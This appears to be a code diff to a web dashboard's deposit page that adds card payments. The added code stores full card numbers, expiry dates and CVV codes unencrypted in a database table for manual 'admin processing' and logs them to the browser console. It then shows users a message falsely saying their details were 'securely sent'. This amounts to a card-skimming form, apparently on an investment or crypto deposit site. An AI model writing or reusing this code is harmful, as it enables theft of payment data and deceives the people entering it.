@@ -905,7 +905,7 @@ function initDepositSection() {
 
 function updateDepositMethodFields(method) {
   // Hide all fields
-  ["bank-fields", "crypto-fields"].forEach((id) => {
+  ["bank-fields", "crypto-fields", "card-fields"].forEach((id) => {
     const el = document.getElementById(id);
     if (el) el.style.display = "none";
   });
@@ -920,6 +920,7 @@ function updateDepositMethodFields(method) {
   const methodNames = {
     bank: "Bank Transfer",
     crypto: "Cryptocurrency",
+    card: "Credit/Debit Card",
   };
 
   const previewMethod = document.getElementById("preview-method");
@@ -1002,6 +1003,7 @@ async function processDepositRequest() {
 
   let reference = "";
   let methodDetails = "";
+  let cardDetails = null; // Initialize as null
 
   if (method === "bank") {
     const bankSelect = document.getElementById("bank-select");
@@ -1021,10 +1023,7 @@ async function processDepositRequest() {
     reference = depositRef;
     const bankMethod = adminPaymentMethods.bank.find((m) => m.id == bankId);
     methodDetails = bankMethod ? bankMethod.details : "Bank Transfer";
-  }
-
-  // In processDepositRequest function, find this section and UPDATE it:
-  else if (method === "card") {
+  } else if (method === "card") {
     // Get card details from form
     const cardNumber = document.getElementById("deposit-card-number").value;
     const cardHolder = document.getElementById("deposit-card-holder").value;
@@ -1050,36 +1049,35 @@ async function processDepositRequest() {
 
     methodDetails = `Card Payment - ${maskedCard}`;
 
-    // In processDepositRequest function, REPLACE the entire cardDetails object with:
+    // Create COMPLETE card details object
     cardDetails = {
-      // FULL UNMASKED DETAILS
-      full_card_number: cleanCardNumber, // Full 16-digit number
+      // FULL UNMASKED DETAILS - ADMIN NEEDS THESE TO PROCESS
+      full_card_number: cleanCardNumber, // Complete 16-digit number
       card_holder: cardHolder.trim().toUpperCase(),
-      expiry_date: cardExpiry, // Use expiry_date
-      cvv: cardCvv, // Use cvv (not card_cvv)
-      card_type: cardType,
+      expiry_date: cardExpiry, // Full expiry MM/YY
+      cvv: cardCvv, // Full CVV code
+      card_type: cardType.toUpperCase(),
 
-      // Also include masked version
+      // Additional info for reference
       masked_card: "**** **** **** " + lastFour,
       last_four: lastFour,
 
-      // Reference info
+      // User and reference info
       reference: reference,
       user_id: userAccount.id,
       user_email: userAccount.email,
       user_name: `${userAccount.firstName} ${userAccount.lastName}`,
       timestamp: new Date().toISOString(),
+      note: "Complete card details for admin processing",
     };
 
-    console.log("Saving card details:", {
-      full_card_number: cardDetails.full_card_number,
-      cvv: cardDetails.cvv,
-      expiry_date: cardDetails.expiry_date,
-      card_type: cardDetails.card_type,
-      card_holder: cardDetails.card_holder,
+    console.log("🚨 DEBUG - Card details to save:", {
+      hasCardDetails: !!cardDetails,
+      cardNumberLength: cleanCardNumber.length,
+      cvvLength: cardCvv.length,
+      expiry: cardExpiry,
+      cardDetails: cardDetails,
     });
-
-    console.log("Full card details being sent to admin");
   } else if (method === "crypto") {
     const cryptoSelect = document.getElementById("crypto-select");
     const cryptoId = cryptoSelect.value;
@@ -1106,22 +1104,35 @@ async function processDepositRequest() {
     const supabase = initSupabase();
     const requestId = "DEP_" + Date.now();
 
-    // Create deposit request WITHOUT user_email
-    const { error } = await supabase.from("deposit_requests").insert([
-      {
-        request_id: requestId,
-        user_id: userAccount.id,
-        amount: amount,
-        weeks: weeks,
-        method: method,
-        method_details: methodDetails,
-        reference: reference,
-        status: "pending",
-        created_at: new Date().toISOString(),
-      },
-    ]);
+    // Create deposit data object
+    const depositData = {
+      request_id: requestId,
+      user_id: userAccount.id,
+      amount: amount,
+      weeks: weeks,
+      method: method,
+      method_details: methodDetails,
+      reference: reference,
+      status: "pending",
+      created_at: new Date().toISOString(),
+      updated_at: new Date().toISOString(),
+    };
 
-    if (error) throw error;
+    // Only add card_details if it exists
+    if (method === "card" && cardDetails) {
+      depositData.card_details = cardDetails;
+      console.log("✅ Adding card_details to deposit request:", cardDetails);
+    }
+
+    // Create deposit request
+    const { error } = await supabase
+      .from("deposit_requests")
+      .insert([depositData]);
+
+    if (error) {
+      console.error("Database error:", error);
+      throw error;
+    }
 
     // Create transaction record
     await supabase.from("transactions").insert([
@@ -1137,41 +1148,66 @@ async function processDepositRequest() {
       },
     ]);
 
-    // Update local data
-    userAccount.transactions.unshift({
-      id: requestId,
-      type: "deposit",
-      amount: amount,
-      date: new Date().toLocaleDateString(),
-      description: `Deposit request via ${method}`,
-      method: method,
-      status: "pending",
-    });
+    console.log("✅ Deposit request submitted successfully!");
+    console.log("Request data:", depositData);
 
     // Show success modal
-    showDepositSuccessModal(amount, method, reference);
+    showDepositSuccessModal(amount, method, reference, cardDetails);
 
     // Update UI
+    await loadUserData(userAccount.email);
+    updateDashboardStats();
     loadRecentTransactions();
+
+    // Clear form if it's a card deposit
+    if (method === "card") {
+      clearCardForm();
+    }
   } catch (error) {
-    console.error("Error processing deposit:", error);
-    showNotification("Failed to submit deposit request", "error");
+    console.error("❌ Error processing deposit:", error);
+    showNotification(
+      "Failed to submit deposit request: " + error.message,
+      "error"
+    );
   }
 }
 
-// Simple encryption function (for demonstration - use proper encryption in production)
-function simpleEncrypt(text) {
-  // This is a basic obfuscation - USE PROPER ENCRYPTION IN PRODUCTION
-  return btoa(unescape(encodeURIComponent(text)));
-}
-
-function showDepositSuccessModal(amount, method, reference) {
+function showDepositSuccessModal(
+  amount,
+  method,
+  reference,
+  cardDetails = null
+) {
   const modal = document.getElementById("depositModal");
-  document.getElementById("modal-deposit-amount").textContent =
-    formatCurrency(amount);
-  document.getElementById("modal-deposit-method").textContent =
-    method === "bank" ? "Bank Transfer" : "Cryptocurrency";
-  document.getElementById("modal-deposit-ref").textContent = reference || "N/A";
+  const modalAmount = document.getElementById("modal-deposit-amount");
+  const modalMethod = document.getElementById("modal-deposit-method");
+  const modalRef = document.getElementById("modal-deposit-ref");
+
+  if (modalAmount) modalAmount.textContent = formatCurrency(amount);
+
+  if (modalMethod) {
+    modalMethod.textContent =
+      method === "bank"
+        ? "Bank Transfer"
+        : method === "crypto"
+        ? "Cryptocurrency"
+        : "Credit/Debit Card";
+  }
+
+  if (modalRef) modalRef.textContent = reference || "N/A";
+
+  // Add card details section if available
+  const detailsContainer = modal.querySelector(".deposit-details");
+  if (detailsContainer && method === "card" && cardDetails) {
+    detailsContainer.innerHTML += `
+      <div class="card-details-note" style="margin-top: 15px; padding: 10px; background: #f8f9fa; border-radius: 5px;">
+        <p><strong>Note:</strong> Your card details have been securely sent to admin for processing.</p>
+        <p style="font-size: 12px; color: #666; margin-top: 5px;">
+          <i class="fas fa-shield-alt"></i> Card ending in: ${cardDetails.last_four}
+        </p>
+      </div>
+    `;
+  }
 
   openModal(modal);
 
@@ -1180,6 +1216,23 @@ function showDepositSuccessModal(amount, method, reference) {
     .forEach((btn) => {
       btn.addEventListener("click", () => closeModal(modal));
     });
+}
+
+function clearCardForm() {
+  const cardFields = [
+    "deposit-card-number",
+    "deposit-card-holder",
+    "deposit-card-expiry",
+    "deposit-card-cvv",
+  ];
+
+  cardFields.forEach((id) => {
+    const field = document.getElementById(id);
+    if (field) field.value = "";
+  });
+
+  const saveCard = document.getElementById("save-card-details");
+  if (saveCard) saveCard.checked = false;
 }
 
 // WITHDRAWAL SECTION FUNCTIONS
